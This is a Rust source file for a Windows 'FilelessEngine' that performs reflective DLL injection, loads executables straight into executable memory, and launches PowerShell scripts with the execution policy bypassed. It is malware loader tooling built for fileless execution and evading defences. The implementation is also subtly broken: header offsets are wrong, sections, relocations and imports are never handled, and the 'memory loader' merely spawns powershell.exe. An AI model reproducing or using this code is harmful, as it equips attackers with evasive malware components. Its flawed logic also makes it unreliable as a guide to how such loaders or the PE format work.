use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READONLY};
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::libloaderapi::LoadLibraryA;
use std::ptr;

pub struct FilelessEngine {
    loaded_modules: Vec<*mut u8>,
}

#[repr(C)]
struct IMAGE_DOS_HEADER {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [u16; 4],
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [u16; 10],
    e_lfanew: i32,
}

impl FilelessEngine {
    pub fn new() -> Self {
        FilelessEngine {
            loaded_modules: Vec::new(),
        }
    }

    pub fn reflective_dll_injection(&mut self, dll_data: &[u8]) -> bool {
        unsafe {
            let dos_header = dll_data.as_ptr() as *const IMAGE_DOS_HEADER;
            if (*dos_header).e_magic != 0x5A4D {
                return false;
            }

            let nt_headers = (dll_data.as_ptr() as usize + (*dos_header).e_lfanew as usize) as *const u32;
            let opt_header_offset = 24;
            let entry_point_rva = *(nt_headers.offset((opt_header_offset + 16) as isize) as *const u32);

            let module_base = VirtualAlloc(
                ptr::null_mut(),
                dll_data.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if module_base.is_null() {
                return false;
            }

            ptr::copy_nonoverlapping(dll_data.as_ptr(), module_base as *mut u8, dll_data.len());

            let entry_point = (module_base as usize + entry_point_rva as usize) as unsafe extern "system" fn() -> bool;
            
            if entry_point() {
                self.loaded_modules.push(module_base as *mut u8);
                true
            } else {
                false
            }
        }
    }

    pub fn power_shell_memory_loader(&self, script: &str) -> bool {
        unsafe {
            let script_bytes = script.as_bytes();
            let alloc = VirtualAlloc(
                ptr::null_mut(),
                script_bytes.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if alloc.is_null() {
                return false;
            }

            ptr::copy_nonoverlapping(script_bytes.as_ptr(), alloc as *mut u8, script_bytes.len());

            let thread = CreateThread(
                ptr::null_mut(),
                0,
                Some(Self::script_executor),
                alloc as _,
                0,
                ptr::null_mut(),
            );

            !thread.is_null()
        }
    }

    unsafe extern "system" fn script_executor(script_ptr: *mut winapi::ctypes::c_void) -> u32 {
        let script = std::ffi::CStr::from_ptr(script_ptr as *const i8);
        let script_str = script.to_string_lossy();
        
        std::process::Command::new("powershell.exe")
            .arg("-NoProfile")
            .arg("-ExecutionPolicy")
            .arg("Bypass")
            .arg("-Command")
            .arg(script_str.as_ref())
            .output();

        0
    }

    pub fn load_pe_from_memory(&mut self, pe_data: &[u8]) -> bool {
        unsafe {
            let dos_header = pe_data.as_ptr() as *const IMAGE_DOS_HEADER;
            if (*dos_header).e_magic != 0x5A4D {
                return false;
            }

            let nt_headers_ptr = (pe_data.as_ptr() as usize + (*dos_header).e_lfanew as usize) as *const u32;
            
            let size_of_image = *(nt_headers_ptr.offset(11) as *const u32);
            let image_base = *(nt_headers_ptr.offset(13) as *const u64);

            let image_mem = VirtualAlloc(
                image_base as _,
                size_of_image as usize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if image_mem.is_null() {
                return false;
            }

            ptr::copy_nonoverlapping(pe_data.as_ptr(), image_mem as *mut u8, pe_data.len());

            let entry_point = *(nt_headers_ptr.offset(16) as *const u32);
            let entry = (image_mem as usize + entry_point as usize) as unsafe extern "system" fn();

            entry();

            self.loaded_modules.push(image_mem as *mut u8);
            true
        }
    }

    pub fn cleanup(&mut self) {
        for module in &self.loaded_modules {
            unsafe {
                winapi::um::memoryapi::VirtualFree(*module as _, 0, winapi::um::winnt::MEM_RELEASE);
            }
        }
        self.loaded_modules.clear();
    }
}

impl Drop for FilelessEngine {
    fn drop(&mut self) {
        self.cleanup();
    }
}
